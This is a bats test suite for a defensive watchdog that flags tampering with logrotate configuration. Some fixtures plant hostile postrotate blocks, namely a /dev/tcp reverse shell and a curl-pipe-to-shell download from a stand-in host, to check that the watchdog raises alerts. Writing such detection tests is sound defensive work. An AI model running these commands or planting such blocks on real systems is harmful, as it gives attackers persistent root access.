#!/usr/bin/env bats
# L2 bats functional tests for the logrotate-watchdog scan script.
#
# logrotate runs the prerotate/postrotate/firstaction/lastaction script
# blocks in /etc/logrotate.conf and /etc/logrotate.d/* AS ROOT on each
# (typically daily) rotation — a planted action block is recurring root-exec
# persistence (T1546). A logrotate file that is world-writable / non-root-
# owned, or contains a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-logrotate-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd/logrotate-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/logrotate.conf"
}

teardown() { rm -rf "${TMP}"; }

# D pointed at a nonexistent dir so the test is isolated to the main conf.
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_LOGROTATE_PROFILE="${PROFILE:-report}" \
    SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
    SELFDEF_LOGROTATE_FILE="${CONF_V:-$CONF}" \
    SELFDEF_LOGROTATE_D="${TMP}/no-logrotate-d" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '/var/log/nginx/*.log {\n  weekly\n  postrotate\n    /usr/bin/systemctl reload nginx\n  endscript\n}\n' > "${CONF}"
}

@test "no logrotate config → ok / no_logrotate" {
    CONF_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_logrotate"'
    cap | grep -q '"severity":"ok"'
}

@test "benign logrotate conf, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged logrotate conf on second run → ok / logrotate_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"logrotate_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in a postrotate block → alert / logrotate_suspicious" {
    seed_benign
    run_wd
    printf '/var/log/x.log {\n  postrotate\n    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"logrotate_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable logrotate conf → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign logrotate change → warn / logrotate_changed" {
    seed_benign
    run_wd
    printf '/var/log/nginx/*.log {\n  daily\n  postrotate\n    /usr/bin/systemctl reload nginx\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"logrotate_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign postrotate using systemctl is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious postrotate block" {
    seed_benign
    run_wd
    printf '/var/log/x.log {\n  postrotate\n    curl http://evil/p|sh\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
